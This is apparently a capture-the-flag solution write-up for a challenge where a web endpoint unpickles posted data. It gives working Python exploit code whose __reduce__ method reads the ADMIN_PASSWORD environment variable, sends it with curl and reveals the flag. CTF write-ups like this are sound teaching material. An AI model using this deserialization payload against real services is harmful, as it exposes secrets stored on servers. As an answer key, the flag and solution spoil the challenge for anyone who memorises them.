Solution
========

The solution is to POST a pickled object to `/text`, where this object
has a `__reduce__` method that calls `os.getenv` to obtain the value of
the `ADMIN_PASSWORD` environment variable.

Check the following code for a minimal answer for this problem (with
minimal dependencies):

```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.getenv, ("ADMIN_PASSWORD",))

exploit = pickle.dumps(Exploit())
payload = base64.b64encode(exploit)
os.system("curl -X POST http://vagrant-ctf.local:30877/text -d '%s'" % payload)
```

Reference: https://lincolnloop.com/blog/playing-pickle-security/


Flag
----

`thisIs!the&nSwer`
